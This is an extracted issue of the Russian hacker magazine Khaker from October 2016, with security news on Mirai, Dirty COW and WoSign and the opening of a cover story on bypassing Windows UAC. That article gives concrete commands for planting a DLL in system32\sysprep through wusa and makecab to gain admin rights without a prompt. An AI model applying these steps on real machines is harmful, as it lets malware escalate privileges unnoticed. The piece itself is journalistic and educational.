                                                              ОКТЯБРЬ 2016


               №213





  Проводим
  атаки через
  DNS


  Пишем
  сплойты
  для обхода DEP





                                                                    Cover
                                                                           Story
  CK                                         10 рабочих способов
                                        обойти защиту
                                          User Access Control
                                          в WindowsUACF*
                                             октябрь 2016
          № 213





  MEGANEWS
Всё новое за последний месяц

  FUCK UAC
10 рабочих способов обхода системы User Account Control в Windows

  Низкоуровневый ремонт
Чиним жесткий диск с MHDD

  Больше чем диск
10 трюков с Dropbox

  Секреты FS
Изучаем уникальные особенности файловых систем

 WWW2
Интересные веб-сервисы

  Comic Con Russia 2016
Наш отчет из Диснейленда для всех гиков и нердов

  Карманный софт
Выпуск #24. Новинки

  Китайский Android
MIUI глазами искушенного пользователя кастомов

  Пальчики прокатаем?
Сканер отпечатка пальца: безопасность и обход защиты

  Библиотека в кармане
Читаем книги, документы и статьи с комфортом

  Мифы о файловой системе F2FS
Колонка Евгения Зобнина

  Мобильный дайджест сентября
Apple AirPods, смерть BlackBerry и самый быстрый эмулятор Android

  EASY HACK
Разбор современных методов взлома

  Обзор эксплоитов
Анализ новых уязвимостей

  В дебрях «Джумлы»
Создаем левые аккаунты и повышаем привилегии в Joomla

  Опасный резолв
Разбираем на пальцах три мощных вектора атак через DNS

  Как мы автоматизировали аудит безопасности в «Яндексе»
Колонка Тараса Иващенко

  Ломаем софт для Android
Часть 2. Внедряем малварь в легитимное приложение

  Флешблек
Используем флешку с дистрибутивом Tails, чтобы скрыть следы своей деятельности.

  X-TOOLS
Софт для взлома и анализа безопасности

  Бесплатные антивирусы от A до Z
Тестируем Anvi Smart Defender Free, Baidu Antivirus, Immunet AntiVirus и Zillya!

  Насаживаем DEP
ret2libc и rop-цепочки против Data Execution Prevention

  Возвращение макровируса
Как потомки старых угроз напрягают пользователей в 2016-м

  Material Design за 15 минут
Проверяем, на что способен ConstraintLayout

  Программирование для Win10 Mobile
Реальное испытание новой мобильной ОС от Microsoft

  Лучшие графические движки для программиста
][-обзор шести популярных движков

  Задачи на собеседованиях
Задачи от Virtuozzo и награждение победителей от Postgres Professional

  Сноуден одобряет
Первый взгляд на защищенный Linux-дистрибутив Subgraph OS

  Строим туннели
Разбираемся с новинками VPN

  Virtuozzo на пальцах
Интервью с Алексеем Кобцом, вице-президентом по разработке Virtuozzo

  Быстрый и свободный
Разбираемся с веб-сервером OpenLiteSpeed

  Переходим на SSD: субъективный опыт
Как мы строили систему хранения данных в виртуализированной среде

  FAQ
Вопросы и ответы

  Титры
Кто делает этот журнал

                                         Мария «Mifrill» Нефедова
                                                       nefedova.maria@gameland.ru





MIRAI
В последний месяц главной темой для новостей и обсуждений остается ин-
тернет вещей, а также мощные DDoS-атаки, которым из-за IoT-малвари под-
верглись известный журналист Брайан Кребс, крупный европейский хостер,
крупный DNS-провайдер и даже небольшая африканская страна.
   Троян, ставший причиной неприятностей, известен под разными имена-
ми (Bashlite, GayFgt, LizKebab, Torlus, Bash0day и Bashdoor), но чаще всего его
называют Mirai. Это обновленная версия известной DDoS-малвари Bashlite,
которая, по данным Level3 Communications, заразила уже порядка миллиона
IoT-устройств. По сути, Mirai работает просто: он сканирует интернет в поис-
ках устройств, уязвимых для брутфорса и других видов взлома. Он поражает
в основном камеры наблюдения, DVR и роутеры, а затем продолжает размно-
жаться, подобно червю. Созданный таким образом ботнет способен генери-
ровать атаки мощностью до 1,5 Тбайт/с, используя TCP/ACK, TCP/ACK + PSH
и TCP/SYN.
  В октябре Брайан Кребс обратил внимание на то, что Anna_Senpai (автор
малвари, с помощью которой была совершена мощная атака на сайт жур-
налиста) опубликовал исходные коды своего трояна на сайте Hack Forums,
и предупредил читателей о надвигающемся шторме. «Похоже, что очень скоро
количество зараженных IoT-устройств возрастет на порядок, а пользователи
начнут жаловаться на снижение скорости работы интернета, так как IoT-девай-
сы забьют весь канал своей деятельностью», — предрек Кребс. Так и вышло.
   21 октября 2016 года пользователи заметили странные перебои в работе
множества сайтов. Доступа не было ко многим ресурсам, входящим в топ-100
Alexa: Twitter, Reddit, Yelp, Imgur, PayPal, Airbnb, Pinterest, Shopify, Soundcloud,
Spotify, GitHub, Heroku, Etsy, Box, Weebly, Wix, Squarespace, CPAN, NPM,
Basecamp, Twilio, Zoho, HBO, CNN, Starbucks, Yammer и другим. Это оказалось
последствиями мощной атаки на DNS-провайдера Dyn, с которой тому не уда-
лось справиться в обычном режиме. Dyn не привыкать бороться с DDoS-ата-
ками, но эта отличалась от остальных: она велась «с десятков миллионов IP-а-
дресов» по всему миру. Эксперты Dyn совместно с Flashpoint и Akamai смогли
определить, что одним из источников трафика был именно ботнет Mirai.
   Главным источником  атаки  стали  IoT-устройства Hangzhou  Xiongmai.
По словам экспертов, продукты этого китайского вендора поставляются с не-
надежными, жестко закодированными паролями по умолчанию и, следова-
тельно, весьма уязвимы для атак трояна. Представители Hangzhou Xiongmai
Technology признали, что выводы исследователей справедливы: «Mirai — это
настоящая катастрофа для интернета вещей. Мы признаем, что наша продук-
ция пострадала от атак хакеров и незаконного использования», — заявили
они в беседе с IDG News. В итоге из продажи в США будут отозваны продукты
Hangzhou Xiongmai, произведенные раньше апреля 2015 года.
    Sierra Wireless, канадский производитель оборудования для сетей сотовой
связи и один из крупнейших игроков на рынке мобильной аппаратуры, тоже
предупредил своих клиентов об опасности, исходящей от трояна Mirai. Пред-
ставители Sierra Wireless сообщили, что роутеры и шлюзы AirLink, используемые
в сетях 3G и 4G LTE по всему миру, уязвимы перед атаками Mirai. В начале октя-
бря 2016 года компания выпустила бюллетень безопасности, в котором пере-
числила модели LS300, GX400, GX/ES440, GX/ES450 и RV50 как уязвимые.
   При этом до сих пор неизвестно, кто именно стоит за недавними DDoS-ата-
ками. Существует множество самых разных теорий. К примеру, один из членов
комьюнити Hack Forums, который занимается продажей малвари Qbot и име-
ет определенную репутацию, высказал мысль, что никто не пытался атаковать
Dyn: на самом деле атака была нацелена на PlayStation Network (в тот день со-
стоялся релиз Battlefield 1), а Dyn стал просто «побочным ущербом».
   Однако история Mirai на этом не закончилась. Скорее наоборот. В конце
октября один из построенных с его помощью ботнетов начал массированную
атаку на целую страну. Исследователь, который обнаружил атаку на африкан-
скую страну Либерию, пишет, что впервые встретил ботнет с таким потенциа-
лом. Один из транзитных провайдеров подтвердил, что поток трафика доходил
до 500 Гбит/с. Удалось выяснить, что этот ботнет принадлежит тем же злоу-
мышленникам, которые атаковали Dyn. Для либерийской инфраструктуры, за-
вязанной на единственный на всю страну подводный оптоволоконный кабель,
атака оказалась крайне ощутимой.
   Многие специалисты сходятся во мнениях, что Либерия представляет со-
бой почти идеальный тестовый полигон для хакеров и замеченная DDoS-ата-
ка — лишь проверка возможностей ботнета. Экспертов тревожит один про-
стой вопрос: если ботнет на базе Mirai, атаковавший Dyn, насчитывал порядка
100 тысяч IoT-устройств, что произойдет, когда размеры ботнета достигнут
миллиона девайсов?



                   «Страх не имеет смысла. За время
                   управления ВКонтакте было многое —
                   DDoS-атаки, уголовные дела, акционер-
                 ные войны, плавящиеся сервера, ме-
                  дийные войны, иски, интриги. Эмоции
                   непродуктивны — делайте то, что нужно
                     сделать».

                                                              поделился опытом в честь десятилетия «ВКонтакте»                                          Павел Дуров

       $682                                   в среднем готовы
                                заплатить пользователи за
                               восстановление файлов
    лет существует bug 5                       Эксперты «Лаборатории Кас-     bounty программа                                                  перского» провели исследование,
        Facebook                     опросив 12 546 пользователей в
                                             21 стране мира. Опрос показал,     Компания Facebook вознагражда-
                                                    что пользователи оценивают стои-   ет исследователей за обнаруженные
                                                мость восстановления хранящихся   уязвимости вот уже на протяжении
                                                на устройстве данных в среднем в   пяти лет. В честь этого маленького
                                             682 доллара. В то же время авторы   юбилея компания поделилась интерес-
                                            шифровальщиков обещают своим   ной статистикой. Суммарно за все эти
                                              жертвам «вернуть все как было» в   годы социальная сеть уже выплатила
                                             среднем за 300 долларов. Возможно,   исследователям более 5 миллионов
                                             именно поэтому порядка 40% поль-   долларов. Причем темпы определенно
                                                 зователей соглашаются на условия   нарастают: только в первой половине
                                             злоумышленников и платят выкуп.   2016 года Facebook получила более
                                              Респонденты признают, что они не   9000 сообщений о багах и вознагради-
                                                  смогут восстановить 15% важных   ла 149 человек, в общей сложности за-
                                              данных в случае потери. Труднее   платив им 611 741 доллар. Для срав-
                                                      всего, по их мнению, вернуть личные   нения: за весь 2015 год было получено
                                            сообщения (36% считают, что они   лишь 13 233 сообщения. Статистика
                                                   будут потеряны навсегда), а также   гласит, что чаще всего призовых денег
                                             фотографии (27% уверены, что не   удостаиваются исследователи из Ин-
                                                  смогут восстановить их).   дии, США и Мексики.





ТЕНЕВЫЕ БРОКЕРЫ
Затея хакерской группы The Shadow Brokers, устроившей в конце лета аукцион
по продаже «кибероружия АНБ», по-видимому, не увенчалась успехом.
   Напомним, что вначале The Shadow Brokers установили простые правила
торгов: нужно было отправлять деньги на биткойн-кошелек группы, выигрывал
тот, чья ставка окажется самой высокой. The Shadow Brokers настолько уве-
рились в успехе своего предприятия, что пообещали выложить в открытый до-
ступ файлы Equation Group, если размер суммарной ставки превысит миллион
биткойнов.
  В октябре, впрочем, выяснилось, что все не так радужно. Хакеры опубли-
ковали объемное послание на нарочито ломаном английском, суть которого
сводилась к одной фразе: никто не заинтересован в покупке дампа эксплоитов
АНБ. При этом хакеры подробно пояснили, почему просто не продали дамп
в даркнете: они признали, что через публичный аукцион планировали привлечь
больше средств. И вообще, «произведение искусства не продают на гаражной
распродаже». Далее хакеры объявили, что аукцион отменяется, а оставшиеся
эксплоиты АНБ будут опубликованы для всех открыто.
   «У The Shadow Brokers есть для вас объявление. The Shadow Brokers надо-
ел аукцион, поэтому с ним покончено. Аукцион все. Аукцион окончен. Аукциона
больше нет. Победителей нет. Кому нужен пароль? The Shadow Brokers опу-
бликуют пароль в открытом доступе, когда будут собраны 10 000 биткойнов.
Тот же биткойн-адрес, тот же файл, собираем краудфандингом на пароль.
Разделим риски. Разделим награду. Все в выигрыше», — пишут хакеры.
   После этого случая The Shadow Brokers, похоже, потеряли вкус к экспери-
ментам с покупателями... но не со взломами. В конце октября члены группы
выложили новый дамп украденной информации. Эксперты по информацион-
ной безопасности уже изучили его и успели сделать первые выводы: архив со-
держит информацию о 306 доменах и 352 IP-адресах, относящихся к 49разным
странам, включая Россию, Китай, Индию и Швецию. Некоторые исследовате-
ли, впрочем, сообщают, что опубликованные данные относятся к 2001–2003
годам и большинства перечисленных в списке серверов уже попросту не су-
ществует.



                  «Использование SMS для аутентифика-
                  ции несет существенные риски для безо-
                    пасности, и необходимо использование
                      других, более безопасных способов, та-
                     ких как применение генераторов одно-
                   разовых паролей (TOTP — Time-based
                   One-time Password Algorithm) с дополни-
                   тельной криптографической защитой».

                                                                       Пресс-служба Минкомсвязи
                                                  о небезопасности двухфакторной аутентификации через SMS





ГРЯЗНАЯ КОРОВА
В ядре Linux была обнаружена серьезная уязвимость, которая почти десять
лет оставалась незамеченной и благодаря этому вошла в состав всех дистри-
бутивов. Уязвимость CVE-2016-5195, получившая имя Dirty COW, существова-
ла в ядре Linux начиная с версии 2.6.22, то есть с 2007 года. Причем иссле-
дователь Фил Остер, обнаруживший проблему, рассказывает в интервью V3,
что эксплоит для данной уязвимости используется в ходе реальных атак.
  Проблема связана с тем, как подсистема памяти ядра работает с механиз-
мом copy-on-write (COW). Эксплуатируя баг, можно спровоцировать так на-
зываемое состояние гонки, из-за чего в итоге неавторизованный локальный
пользователь сможет получить доступ к memory mappings с правом записи,
тогда как в нормальной ситуации доступ должен ограничиваться только чтени-
ем (read-only).
   Несмотря на то что Dirty COW даже не RCE-уязвимость, многие эксперты
всерьез обеспокоены. Во-первых, уязвимость была обнаружена в самом ядре
Linux и, хуже того, в той его части, которая включается в любые дистрибутивы
на протяжении почти десяти лет. Во-вторых, создать эксплоит для Dirty COW
совсем нетрудно: к примеру, независимый исследователь Дэвид Манучери
уже опубликовал код эксплоита, который позволяет использовать уязвимость
Dirty COW для получения root-привилегий на Android. В-третьих, неизвестно,
сколько времени проблема эксплуатируется злоумышленниками.


ЖЕРТВАМИ «ФАЛЬШИВОЙ ТЕХПОДДЕРЖКИ»
ЧАЩЕ СТАНОВЯТСЯ МОЛОДЫЕ ЛЮДИ

   Компания Microsoft представила результаты опроса, согласно которому на удочку скамеров
чаще всего попадаются отнюдь не пожилые люди, плохо разбирающиеся в технике. Жертвами
мошенников, представляющихся специалистами технической поддержки, чаще становятся мо-
лодые люди в возрасте от 18 до 34 лет, и не важно, попали они на сайт фиктивной технической
поддержки или приняли сомнительный телефонный звонок.
Только 1 из 5 пользователей способен опознать скамера и вовремя прервать разговор или
закрыть страницу в браузере

2 из 3 пользователей за последний год хотя бы раз сталкивались с мошенниками из
«техподдержки»
Каждый 10-й опрошенный признался, что за последний год уже терял деньги из-за фейковой
технической поддержки

50% жертв мошенников — это молодые люди в возрасте от 18 до 34 лет
Только 17% пострадавших от рук скамеров старше 55 лет





ПОСЛЕДНЕЕ
КИТАЙСКОЕ
ПРЕДУПРЕЖДЕНИЕ
В конце сентября 2016 года организация Mozilla объявила о прекращении дове-
рия китайскому удостоверяющему центру WoSign. Выяснилось, что WoSign вы-
давал сертификаты SHA-1 для различных доменов задним числом и без надле-
жащих верификаций, датируя их декабрем 2015 года, тогда как Mozilla позволяет
выпускать сертификаты SHA-1 только после 1 января 2016 года. При этом обяза-
тельны комплексные проверки, от которых представители WoSign уклонились.
  В октябре позицию аналитиков Mozilla поддержала компания Apple. Види-
мо, отчет Mozilla показался Apple достаточным основанием для бана WoSign:
с октября 2016 года iOS и macOS перестали доверять сертификатам WoSign,
выпущенным позже 19 сентября. Представители Apple объяснили, что, хотя
корневых сертификатов WoSign в списках доверия и не было, удостоверяющий
центр использовал промежуточные сертификаты StartCom и Comodo, которым
продукты Apple доверяли. Именно они и попали в бан.
  К числу недовольных также присоединилась и компания Google. «Мы при-
шли к выводу, что с обоими CA связана череда проблем и инцидентов, которые
указывают, что их подход к безопасности не отвечает обязательствам, которые
берут на себя доверенные CA», — сообщили представители Google. В резуль-
тате разработчики Chrome объявили, что релиз за номером 56 (он ожидает-
ся в январе 2017 года) перестанет доверять сертификатам WoSign и StartCom,
выпущенным позже 21 октября 2016 года. Чтобы избежать проблем, сертифи-
каты, выпущенные раньше этой даты, будут поддерживаться, в частности, если
они отвечают требованиям Chrome Certificate Transparency.



                           Продолжение статьи
   Начало статьи





КАК ХАКЕРЫ
ОБМАНЫВАЮТ
ИБ-ЭКСПЕРТОВ
Специалисты «Лаборатории Касперского» рассказали, что идентификация
хакерских группировок, которые стоят за целевыми и АРТ-атаками, — задача
не из легких. В своем отчете эксперты назвали часть техник, которыми пользу-
ются хакеры:
•  вредоносное ПО может содержать ложные временные метки, которые не по-
   зволяют экспертам определить точное время его написания;
•  вредоносные файлы могут содержать строки кода, умышленно написанные
   на других языках (к примеру, арабском);
•  управляющие серверы злоумышленников могут быть расположены в наро-
   чито подставных зонах (к примеру, по южнокорейским IP-адресам) в расче-
   те на их обнаружение;
•  хакеры могут наравне с утилитами собственного производства использо-
   вать чужую малварь, но не для взлома, а просто для отвода глаз;
•  некоторые хакеры открыто пользуются именами других хакерских группиро-
   вок (необязательно даже существующих).

С полным отчетом аналитиков можно ознакомиться здесь (PDF).



               «Мы решили не то чтобы заморозить
                    [работу над законопроектом, предпола-
                 гавшим уголовное наказание за пользо-
                  вание криптовалютой. — Прим. ред.], а
                  немножко подождать и посмотреть, как
                   будет развиваться ситуация на междуна-
                 родном уровне, и с учетом этого принять
                  решение. Общественная опасность все-
                    го этого сейчас не слишком велика, по-
                   тому что нет такой массовости, которая
                  могла бы какую-то угрозу нашей финан-
                  совой системе представлять сейчас».

                                                                                             о том,                                                   Министр финансов РФ Алексей Моисеев
                                                              что в Минфине пока передумали сажать за использование
                                                                 денежных суррогатов, в том числе криптовалют





КАК ОТМЫВАЮТ
ДЕНЬГИ В ИГРАХ
Внутриигровые деньги зачастую остаются за пределами внимания правоох-
ранительных органов и властей, в отличие от других виртуальных и бумажных
валют. Аналитики компании Trend Micro представили доклад о киберкрими-
нальной активности в онлайновых играх, через которые проходят огромные
денежные потоки.
  По данным Trend Micro, криминальные группы проводят немало времени,
конвертируя похищенное в биткойны посредством обмена на игровые день-
ги. Многие хакерские группировки взламывают геймеров и игровые компа-
нии, чтобы похитить виртуальные деньги, затем перепродав и обналичив свой
«улов» в даркнете. В большинстве случаев игроков взламывают при помощи
фишинга; чуть реже встречаются уязвимости на серверах компании-разра-
ботчика или какие-то внутриигровые баги, которые позволяют генерировать
огромное количество игровых денег. Также по-прежнему актуален «дупинг»,
при помощи которого мошенники создают копии внутриигровых предметов.
Не забыли в киберкриминальной среде и о старом добром фарме голды.
  Одной из основных угроз для игроков остается всевозможная малварь вро-
де инфостилеров или программ для сбора паролей. Такой подход злоумыш-
ленники используют чаще других, ведь он позволяет похитить не только паро-
ли от игровых аккаунтов, но и персональные данные жертвы. Собранные таким
образом данные обычно становятся объектом для продажи, а не используют-
ся самими хакерами.

         3 20097%
    всех вредоносных          000  почтовых вложений —            банковских карт
   это шифровальщик          скомпрометированы
         Locky                       в Индии
                                                  Государственный банк Индии    По данным специалистов компании                                                       (SBI) предупредил о масштабной ха-  Proofpoint, в третьем квартале 2016                                                керской атаке, в результате которой  года количество спамерских писем,                                             компрометации подверглись более  распространяющих малварь, достигло                                            3 миллионов банковских карт. Вина  рекордных показателей. К примеру,                                                 за случившееся лежит на финансовой  аналитики предупреждают, что чис-                                               организации YES Bank, а точнее ее  ло вредоносных JavaScript-вложений                                                 партнере, компании Hitachi Payments,  возросло на 69% по сравнению со                                            отвечающей за работу банкоматов  вторым кварталом текущего года. Од-                                             и PoS-систем. По данным следствия,  нако вредоносный JavaScript — это                                             системы Hitachi Payments оказались  далеко не главная проблема. Среди                                            заражены малварью, которая более  угроз по-прежнему лидирует всевоз-                                            шести недель собирала информацию  можное вымогательское ПО, причем                                             о банковских картах. В руки злоумыш-  в 96,8% случаев им оказывается одна                                               ленников попали данные о 2,6 мил-  из версий шифровальщика Locky, что                                              лиона карт Visa и MasterCard, а также  превышает показатели предыдущего                                           информация о почти миллионе карт  квартала на 28%. Помимо Locky, среди                                                RuPay. Пострадали клиенты SBI, HDFC  спамеров также остаются популярны-                                                 Bank, ICICI Bank, YES Bank и Axis  ми вымогатели CryptFIle2, MarsJoke и                                                 Bank. Уже инициирована процедура  Cerber.                                               аннулирования и перевыпуска карт.





                  «Дорогая российская пресса!
                Пришла моя очередь спрашивать: кто
                 вам сказал, что слово «опроверг» можно
                   использовать вместо слова «соврал» или
                   «не признает»?
                    Потому что два дня уже в Яндекс.Но-
                    востях новость про Лурк идет с пометкой
                    от Ампелонского «мы не разблокирова-
                   ли Лурк», и каждое новостное издание
                  сделало по реплике Ампелонского но-
                   востную заметку. Я чуть с ума не сошел,
                   потому что в реестре Роскомнадзора нет
                    никакого Лурка. Ни по домену (ни по од-
                  ному из), ни по IP.
                     Зато есть ссылка на lurklurk.com, со-
                   зданное фанатами зеркало, — их штук
                     пять возникло за время блокировки Лурка.
                  Но Ампелонский вместе со всем Ро-
                  скомнадзором не в состоянии отличить
                   статичную копию Лурка от полноценного
                   зеркала и продолжает талдычить, что «мы
                  блокируем Лурк».
                    У настоящего Лурка в домене напи-
                  сано lurkmore: lurkmore.to, lurkmore.ru,
                      lurkmore.so, lurkmore.co, lurkmore.net или
                 даже просто lurkmo.re.
                   А остальное — творчество поклонни-
                      ков, за что им спасибо.
                  Но у меня традиционный вопрос к
                  российским журналистам: а у меня уточ-
                    нить можно было? Или вы как слышите
                   «опровержение», так у вас все, полная
                     утрата жизненных показателей, цель до-
                     стигнута?».

                                                                                 о снятии блокировок                                                         Создатель Lurkmore Давид Хомак
                                                                            с сайта и работе российских СМИ





САМЫЕ
РАСПРОСТРАНЕН-
НЫЕ IOT-УГРОЗЫ
Аналитики компании «Доктор Веб» изучили наиболее актуальные на сегод-
няшний день угрозы для Linux-систем.
   Исследователи пишут, что основная цель киберпреступников, распростра-
няющих IoT-малварь, — создание ботнетов для осуществления DDoS-атак.
В отчете перечисляются пятнадцать различных видов вредоносных программ,
которые чаще всего загружаются злоумышленниками на взломанные устрой-
ства. Большинство зловредов относится к семействам Linux.DownLoader,
Linux.DDoS и Linux.BackDoor.Fgt. Самым распространенным стал троян Linux.
Downloader.37, предназначенный для DDoS-атак. Встречаются также пред-
ставители семейств  Linux.Mrblack, Linux.BackDoor.Gates,  Linux.Mirai,  Linux.
Nyadrop, Perl.Flood и Perl.DDoS.
  По сути, вся перечисленная малварь применяет в ходе атак одну и ту же
простую тактику: брутфорсит логин и пароль, подключившись по протоколам
Telnet или SSH. Исследователи пишут, что по Telnet злоумышленники чаще
всего пытаются соединиться с атакуемым узлом с использованием логина
root, а по SSH — admin.


БОЛЬШИНСТВО РОУТЕРОВ НАСТРОЕНЫ
НЕПРАВИЛЬНО

   Аналитики компании ESET решили проверить безопасность и настройку роутеров, ведь
атаки на IoT-устройства стали настоящим трендом ушедшего октября, а злоумышленники и
специальная малварь чаще всего компрометируют именно роутеры, IP-камеры и DVR-системы.
Поделиться данными с исследователями согласились более 12 000 домашних пользователей.
Оказалось, что нежелание обновлять ПО и придумывать надежные пароли по-прежнему остает-
ся основной проблемой данного сегмента.
15% всех изученных роутеров имеют слабые пароли, а в качестве имени пользователя обычно
оставлено дефолтное значение admin
Каждая 7-я попытка брутфорса         7% устройств имеют серьезные и умеренные
роутеров оказывается удачной                  уязвимости,
                         53% роутеров имеют уязвимости bad accessПроцентное соотношение                                                           rights,сервисов со слабыми паролями:
                                      еще 39% устройств допускают инъекции
    HNAP                      HTTP       команд,
     1%                    63%                                             а 10% девайсов уязвимы перед
                                              эксплуатацией XSS-багов
                                                                      Bad access TELNET
                                                                                                    rights  14%
                                                                                                   vulnerabilities                                                  Cross-site                                                                 53%                                                       scripting
                                                      vulnerabilities
                                   8%

         FTP
       22%

Более чем у 20% изученных                                     Command injectionроутеров открыты Telnet-порты,
                                                          vulnerabilities 39%свободно доступные через интернет





ХАКЕРЫ
СВЕРЛЯТ ДЫРКИ
В БАНКОМАТАХ
Курьезная, но тем не менее вполне серьезная новость: в ходе международ-
ной конференции «Актуальные вопросы развития наличного денежного об-
ращения» зампред Сбербанка Станислав Кузнецов рассказал журналистам
РИА «Новости», что хакеры придумали новый способ кражи наличности из бан-
коматов.
   «Тенденция появилась буквально четыре-пять месяцев назад, вид нового
преступления называется drilled box, когда просверливается дырочка в бан-
комате — в определенных видах банкомата, определенной марки, мы все их
знаем — и подключается шина и [с помощью] этой шины выкачиваются мгно-
венно деньги», — рассказал Кузнецов.
   Сбербанк, которому принадлежат порядка 80 тысяч банкоматов, собира-
ется отказывать некоторым производителям в сотрудничестве в случае несо-
блюдения правил безопасности, также предупредил Кузнецов. Судя по всему,
зампред Сбербанка описал нечто похожее на так называемые cash out атаки,
в ходе которых хакеры снимают всю наличность из атакуемого банкомата.
 COVERSTORY





   Алиса «0xfemale»
     Белоусова,
   oxfemale@yandex.ru,
       kitsune.online





       84ckf1r3
   84ckf1r3@gmail.com

FUCK
UAC 10 РАБОЧИХ СПОСОБОВ ОБХОДА СИСТЕМЫ
 USER ACCOUNT CONTROL В WINDOWS





 UAC КАК ОГРОМНЫЙ БАГ
 В хакерской философии многое заимствовано из боевых
  искусств. Например, мастер айкидо практически не ата-
  кует сам. Он лишь подмечает ошибки соперника и обра-
 щает его усилия против него самого. Так же и просчеты
  в защитных системах позволяют превратить их в хакер-
  ский инструмент. Сейчас мы разберем несколько спо-                                                WARNING
 собов обхода UAC и даже его использования для запу-
  ска своего кода с повышенными привилегиями. Многие    Вся информация приво-
  из этих методов уже реализованы в троянах и позволяют     дится исключительно в
                                                                           ознакомительных целях! им скрытно внедряться в систему.                                                                                        Microsoft рекомендует
                                                                                 патчить винду вовремя,
 БЕЛЫЙ СПИСОК ДЛЯ ЧЕРНЫХ ШЛЯП                  не работать в админской
                                                                                    учетке без реальной Во всех версиях Windows для UAC существует так назы-                                                                           необходимости, не обхо-
 ваемый белый список — набор системных компонентов,                                                                               дить UAC и не донимать
  для которых не применяются ограничивающие правила.     техподдержку сообще-
 Поэтому один из самых распространенных методов ата-     ниями об уязвимостях.
  ки сводится к попытке найти любые приложения из бело-
  го списка и попытаться внедрить в них свою *.dll.
    Провести атаку типа DLL  hijack сравнительно просто, хотя и здесь не
  обходится без подводных камней. Они свои в каждой версии ОС, а также
  зависят от настроек, учетной записи, разрядности ОС, установленных компо-
  нентов и патчей.
    Например, в Windows 7/8 (но не 8.1) можно использовать штатную про-
 грамму подготовки системы к развертыванию sysprep.exe, чтобы подгрузить
 свою версию cryptbase.dll или другой библиотеки. Для этого достаточно
  поместить ее рядом с экзешником, поскольку он начинает искать и подгру-
  жать DLL’ки из своего каталога. Однако при попытке просто скопировать свой
 файл в каталог %systemroot%/system32/sysprep/ мы получим сообщение
 об ошибке.





                                                    Доступ в \system32\ запрещен


 У пользователя нет прав доступа на запись в системный каталог, а админи-
  стратор должен подтвердить это действие через UAC. Чтобы наш код получил
 необходимые права без лишних вопросов, используем другой трюк — с авто-
 номным установщиком обновлений Windows.
    Поместим cryptbase.dll в архив CAB. Не будем останавливаться на том,
  как сделать эту элементарную операцию. Она подробно описана на сайте
  Microsoft. Пусть наша библиотека называется evil.dll и находится в каталоге
 \FCKUAC на диске C:\. Тогда следующей командой мы сделаем «заряженный»
  архив:

  makecab C:\FCKUAC\evil.dll C:\FCKUAC\evil.cab





                                                      Архив с нашей библиотекой


 Скормим этот архив автономному установщику обновлений (Windows Update
  Standalone Installer).

  wusa C:\FCKUAC\evil.cab /quite /extract:%systemroot%\system32\sysprep\

 Он распакует его в \system32\sysprep\, а «контроль учетных записей» будет
  молчать.





                                             Утилита sysprep как встроенный бэкдор


 Если умеешь программировать, то можешь запустить sysprep.exe скрыто —
  например, через CreateProcess() с флагом StartupInfo.wShowWindow  =
  SW_HIDE. На скрытые окна сегодня ругаются эвристические анализаторы мно-
  гих антивирусов, но сейчас мы говорим только про UAC — ему все равно.
 После такого запуска sysprep.exe попытается загрузить и выполнить библио-
  теку CRYPTBASE.dll, но на ее месте окажется наша, уже содержащая нужную
 нам функциональность. Она совершенно легально поднимет права нашему
  коду, и UAC примет это как должное.
    Это происходит потому, что wusa и sysprep находятся в белом списке, а все
 приложения из этого списка могут поднимать себе права без участия UAC.
 Наш же код из подгружаемой установщиком библиотеки унаследует права ро-
  дительского процесса sysprep.exe и также будет считаться доверенным.





                                            Использование sysprep для обхода UAC


 Рассмотренный выше трюк совместного использо-
  вания wusa и sysprep представляет собой модифи-
 цированный метод Лео Дэвидсона (Leo Davidson).
 Исходный вариант был применим только к непро-
  патченной Windows 7 и был описан еще в 2009 году
  в рассылке компьютерного сообщества Оксфордско-          INFO
  го университета. Копия приводится на его сайте, ко-
                                                           В каждой версии Windows торый из-за обилия подобного кода внесен в списки                                                                              (начиная с Vista) есть
  потенциально опасных.                                                                         стандартный компонент
    Метод Дэвидсона в различных модификациях уже    UAC (User Account Control).
 много лет используется для внедрения троянов, осо-    Он включен по умолчанию
                                                                     и не дает пользователю
 бенно семейства Win32/Carberp. Пик эпидемии при-                                                                          «выстрелить себе в ногу»,
 шелся на осень 2011 года, но способ до сих пор ра-       запустив какую-нибудь
  ботает в следующем типичном сценарии: действия     малварь с правами админа.
                                                           В этой статье я расскажу, выполняются в 32-битной версии Windows 7/8 под                                                                              как использовать «контроль
  учетной записью администратора при включенном         учетных записей» в
 UAC с настройками по умолчанию. Простому поль-      своих целях — например,
                                                                               запустить любой код с зователю нельзя запускать wusa.exe, но многие                                                                    правами администратора
 до сих пор сидят под админом без реальной необ-                                                                       или даже как системный
  ходимости. Просто им лень создавать пользователь-             процесс.
  ские учетки и управлять правами доступа даже через
 встроенные средства.
    Мэтт Грэбер (Matt Graeber) уточняет, что данный метод не работает «как
  есть» в Windows 8.1/10, поскольку в этих ОС изменены как sysprep.exe, так
 и сам UAC. Теперь программа подготовки системы к развертыванию загружа-
  ет DLL только из %windir%\system32\.

 АВТОМАТИЧЕСКОЕ ПОВЫШЕНИЕ ПРИВИЛЕГИЙ
 Если по каким-то причинам доступа к установщику обновлений нет, то можно
  использовать другой вариант — копирование файла в системный каталог ме-
 тодом IFileOperation.
    Суть метода в том, что для обхода UAC в нашей библиотеке создается
 COM-объект IFileOperation. Он позволяет скопировать файл куда угодно
  (в том числе в системную директорию \system32\ и ее подкаталоги), авто-
  матически повышая для этого привилегии, так как функция будет иметь флаг
  auto-elevate.
    Вот пример использования объекта IFileOperation для копирования
 файла в системный каталог.
    Метод внедрения своей библиотеки в процесс explorer.exe рассматри-
  вается в этом примере.
    Список приложений из белого списка можно посмотреть тут. Также его
 можно сгенерировать самому, просто найдя в системном каталоге Windows
  экзешники, содержащие строку autoelevate.





                                    Создаем список программ из белого списка UAC


 В зависимости от используемой программы из белого списка и версии
 Windows можно подменить ту или иную библиотеку (см. таблицу).





                                Стандартные компоненты и подменяемые библиотеки


 Методы перебора этих вариантов собраны в одну PowerShell-утилиту.

 ISECURITYEDITOR
  Удивительно, что большинство методов обхода «кон-
  троля учетных записей» были умышленно заложены са-
 мими разработчиками Windows. Провал «Висты» мар-
  кетологи связали с неудобным поведением нового
  компонента, и в «семерке» UAC постарались сделать
 менее назойливым. Для этого пришлось делать косты-     WWW
  ли из белого списка и метода автоматического повы-
                                                                           Классический метод
 шения привилегий (без подтверждения пользователем)                                                                              обхода UAC
  у сорока с лишним системных программ. К функции         от Лео Дэвидсона
  autoElevate были написаны COM-интерфейсы: докумен-
                                                                              Скрипт для тированный IFileOperation (который разбирался выше)                                                                               автоматического
 и недокументированный ISecurityEditor, об использова-       перебора основных
